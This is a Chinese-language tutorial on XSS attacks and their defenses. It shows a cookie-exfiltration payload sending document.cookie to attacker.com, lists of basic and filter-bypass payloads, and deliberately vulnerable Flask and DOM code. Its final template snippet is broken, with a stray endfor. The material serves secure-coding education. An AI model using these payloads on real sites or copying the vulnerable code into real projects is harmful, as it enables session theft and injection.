# XSS 跨站脚本攻击

你在一个博客网站评论区输入了 `<script>alert('XSS')</script>`，结果弹出警告框。这就是 XSS 攻击的雏形。

**XSS（Cross-Site Scripting）** 跨站脚本攻击，是最常见的 Web 应用漏洞之一。它的核心是：**注入恶意脚本到信任的网站上执行**。

## 问题背景

XSS 为什么叫 Cross-Site Scripting？因为早期攻击方式是跨域注入脚本。

```
攻击者 -> 在受害者信任的网站注入脚本 -> 用户访问 -> 脚本在用户浏览器执行
```

攻击者可以做的事：

- 窃取 Cookie/Session
- 读取用户页面内容
- 键盘记录
- 修改页面内容
- 进行钓鱼攻击

## XSS 的三种类型

### 1. 反射型 XSS

恶意脚本作为 URL 参数传递，服务端立即「反射」回响应：

```
正常 URL：https://example.com/search?q=keyword
攻击 URL：https://example.com/search?q=<script>stealCookie()</script>
```

服务端代码（错误示例）：

```python
# Flask 错误示例：直接输出用户输入
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # 直接返回用户输入 - XSS 漏洞！
    return f'<h1>搜索结果: {query}</h1>'
```

攻击效果：
```
用户访问：https://example.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
浏览器收到响应后执行脚本，Cookie 被发送到攻击者服务器
```

### 2. 存储型 XSS

恶意脚本被永久存储在目标服务器（数据库、评论、用户资料），所有访问该数据的用户都会中招：

```
攻击流程：
1. 攻击者在评论区发布：<script>stealCookie()</script>
2. 服务器存储这条评论
3. 其他用户访问评论区
4. 服务器返回包含恶意脚本的页面
5. 用户浏览器执行脚本
```

```python
# Flask 错误示例
@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form['comment']

    # 直接存储用户输入 - 存储型 XSS！
    db.comments.insert({
        'text': comment  # 没有转义
    })

    return redirect('/comments')

@app.route('/comments')
def show_comments():
    comments = db.comments.find()
    # 直接输出 - 漏洞！
    html = '<ul>'
    for c in comments:
        html += f'<li>{c["text"]}</li>'  # 没有转义
    html += '</ul>'
    return html
```

### 3. DOM 型 XSS

恶意脚本通过修改页面的 DOM 环境来执行，完全在客户端执行，不经过服务端：

```javascript
// 错误示例：直接使用用户输入修改 DOM
const params = new URLSearchParams(window.location.search);
const name = params.get('name');

// 直接插入 DOM - DOM 型 XSS！
document.getElementById('welcome').innerHTML = 'Welcome ' + name;
```

攻击 URL：
```
https://example.com?name=<img src=x onerror="stealCookie()">
```

## XSS 攻击向量

### 基本 Payload

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">click</a>
<div onclick="alert('XSS')">click</div>
```

### 绕过过滤

```javascript
// 大小写混合
<ScRiPt>alert('XSS')</sCrIpT>

// 事件处理器
<img src="x" onerror="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>

// 编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
// 解码后：alert('XSS')

// SVG 标签
<svg><script>alert('XSS')</script></svg>

// 多重嵌套
<<script>alert('XSS')//<</script>

// 利用 DOM
<div id="x">${user_input}</div>
<script>eval('var msg = "' + user_input + '"')</script>
```

## 防御策略

### 1. 输入验证

```python
import html
import re

def sanitize_input(user_input):
    """基本输入验证"""
    # 移除危险标签
    dangerous_patterns = [
        r'<script[^>]*>.*?</script>',
        r'javascript:',
        r'on\w+\s*=',
    ]

    sanitized = user_input
    for pattern in dangerous_patterns:
        sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)

    return sanitized
```

### 2. 输出编码（最重要的防御）

根据输出位置选择合适的编码方式：

| 输出位置 | 编码类型 | 例子 |
|---|---|---|
| HTML 内容 | HTML 实体编码 | `<` -> `&lt;` |
| HTML 属性 | HTML 实体编码 + 属性引号 | `"` -> `&quot;` |
| JavaScript | JavaScript 转义 | `"` -> `\x22` |
| URL 参数 | URL 编码 | `&` -> `%26` |
| CSS | CSS 转义 | `\` -> `\\` |

```python
import html

def safe_html(value):
    """HTML 内容安全输出"""
    return html.escape(value, quote=True)

def safe_attribute(value):
    """HTML 属性安全输出"""
    return html.escape(value, quote=True)

def safe_javascript(value):
    """JavaScript 安全输出"""
    # JSON 编码
    import json
    return json.dumps(value)

# Flask 正确示例
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # 使用模板引擎的自动转义
    return render_template('search.html', query=query)

# search.html
# {{ query }}  # 模板引擎自动转义
```

### 3. Content Security Policy

```html
<!-- CSP 头 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;">

<!-- 或者通过 HTTP 头 -->
<!-- Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz123'; -->
```

CSP 指令：

| 指令 | 说明 |
|---|---|
| default-src | 默认来源 |
| script-src | JavaScript 来源 |
| style-src | CSS 来源 |
| img-src | 图片来源 |
| connect-src | AJAX/WebSocket 来源 |
| frame-src | iframe 来源 |

### 4. HttpOnly 和 Secure Cookie

```python
# 设置 HttpOnly Cookie
response.set_cookie(
    'session_id',
    session_id,
    httponly=True,  # JavaScript 无法访问
    secure=True,     # 仅 HTTPS 传输
    samesite='Strict'  # CSRF 防护
)
```

### 5. Flask/Jinja2 安全配置

```python
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# 使用 Talisman 自动配置安全头
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': "'self' 'nonce-{nonce}'",
    'style-src': "'self' 'unsafe-inline'",
})

# Jinja2 自动转义已默认启用
```

## 完整防御示例

```python
from flask import Flask, request, escape
import bleach

app = Flask(__name__)

# 使用 bleach 库清理 HTML
ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}

@app.route('/comment', methods=['POST'])
def post_comment():
    # 1. 验证输入
    text = request.form.get('comment', '')
    if len(text) > 1000:
        return '评论过长', 400

    # 2. 清理 HTML
    sanitized = bleach.clean(
        text,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

    # 3. 存储
    db.comments.insert({
        'text': sanitized,
        'user_id': current_user.id
    })

    return redirect('/comments')

@app.route('/comments')
def show_comments():
    comments = db.comments.find()
    # 使用模板引擎，Jinja2 默认转义
    return render_template('comments.html', comments=comments)
```

```html
<!-- comments.html -->

<div class="comment">
    <p>{{ comment.text }}</p>  <!-- Jinja2 自动转义 -->
</div>
{% endfor %}
```
